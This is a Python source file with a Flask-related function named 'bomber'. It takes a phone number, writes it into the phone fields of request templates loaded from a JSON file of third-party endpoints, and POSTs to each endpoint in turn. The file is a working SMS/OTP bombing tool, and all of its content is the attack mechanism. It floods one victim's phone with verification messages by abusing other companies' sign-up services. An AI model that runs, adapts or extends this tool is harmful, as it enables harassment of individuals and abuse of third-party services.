import requests
from markupsafe import escape
import json
from flask import Flask, jsonify, request
import time


def bomber(number):
    new_number = number
    results = []

    # Keys to update in Payload are given here
    keys_to_update = [
        "phone",
        "mobile_num",
        "mobileNumber",
        "mobile",
        "mobileNo",
        "Mobile_Email",
        "number",
    ]

    # Opening JSON file
    f = open("json/info.json")

    # returns JSON object as a dictionary
    data = json.load(f)

    # Iterating through the json list
    for obj in data:
        url = obj["url"]
        headers = obj["headers"]
        payload = obj["body"]
        for key in keys_to_update:
            if key in payload:
                obj["body"][key] = new_number

        time.sleep(1)  # wait for 100 m-seconds
        response = requests.post(url, headers=headers, json=payload)

        results.append(
            {
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "body": response.text,
            }
        )

    # Closing file
    f.close()
    return jsonify(results)
